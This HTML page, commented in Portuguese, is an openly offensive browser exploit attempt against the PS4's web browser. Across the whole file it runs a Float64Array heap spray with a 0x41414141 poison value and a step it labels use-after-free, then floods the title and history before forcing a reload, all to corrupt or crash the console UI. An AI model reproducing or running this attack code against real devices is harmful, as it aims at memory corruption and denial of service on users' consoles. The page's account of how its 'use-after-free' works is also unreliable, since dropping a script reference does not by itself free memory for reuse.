<!DOCTYPE html>
<html>
<head>
    <title>PS4 UI CORRUPTION TRIGGER</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #0f0; background: #111; margin: 20px auto; display: block;}
        button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #040; color: white; border: 2px solid #0f0; font-weight: bold; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #000; color: #0f0; }
    </style>
</head>
<body>

<h1>UI STRING POISONING</h1>
<h3>Objetivo: Forçar o aparecimento de "func_refresh" ou Crash de UI</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#020; color:#fff; text-align:center'>
        <h3>ZONA DE GATILHO UI</h3>
        <button onclick='startSequence()' style='padding:15px; background:green; color:white; font-weight:bold; border:2px solid white;'>
            INICIAR TEMPESTADE DE UI
        </button>
        <div id='status'>Pronto.</div>
        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            // Usamos um padrão repetitivo de bytes que podem ser lidos como strings ou ponteiros
            // 0x4141414141414141 ('AAAAAAAA')
            const POISON = 2.121995791e-314; 

            function startSequence() {
                document.getElementById('status').innerText = '1. Preparando Heap...';
                
                // 1. Setup Heap
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }

                document.getElementById('status').innerText = '2. APERTE OPTIONS AGORA!';
                
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null;
                    
                    // Spray Massivo
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    // 4. A CEREJA DO BOLO: SPAM DE UI
                    // Tenta forçar o navegador a redesenhar textos usando memória suja
                    
                    // A: Mudar o título da página (Isso atualiza a UI do navegador lá em cima)
                    // Fazemos isso 100 vezes muito rápido
                    var spamCount = 0;
                    var interval = setInterval(function() {
                        document.title = 'CORRUPT_' + spamCount + '_' + 'A'.repeat(100);
                        
                        // B: Mudar o Histórico (Isso atualiza a lista interna de 'Voltar')
                        history.pushState({}, 'Title '+spamCount, '?ui='+spamCount);
                        
                        spamCount++;
                        if(spamCount > 50) {
                            clearInterval(interval);
                            // C: O Golpe Final - Native Alert
                            // Isso pausa o JS e força o desenho de uma janela nativa do OS.
                            // Se os ponteiros de texto estiverem sujos, a janela vem quebrada.
                            // window.alert('CHECK UI NOW!');
                            
                            // OU: Forçar Reload para desencadear o crash se a UI estiver suja
                            window.location.reload();
                        }
                    }, 5);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

</body>
</html>
